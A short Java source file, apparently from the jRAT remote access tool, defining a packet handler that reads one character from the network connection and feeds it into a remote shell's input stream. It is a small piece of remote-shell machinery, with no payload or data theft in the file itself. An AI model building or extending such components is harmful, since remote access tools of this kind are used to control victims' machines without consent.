package jrat.module.shell.packets;

import jrat.client.Connection;
import jrat.module.shell.RemoteShell;
import jrat.client.packets.incoming.IncomingPacket;

import java.io.PrintWriter;

public class Packet22RemoteShellTyped implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		char c = con.getDataInputStream().readChar();

		PrintWriter input = new PrintWriter(RemoteShell.getInstance().getOutputStream(), true);
		input.print(c);
		input.flush();
	}

}
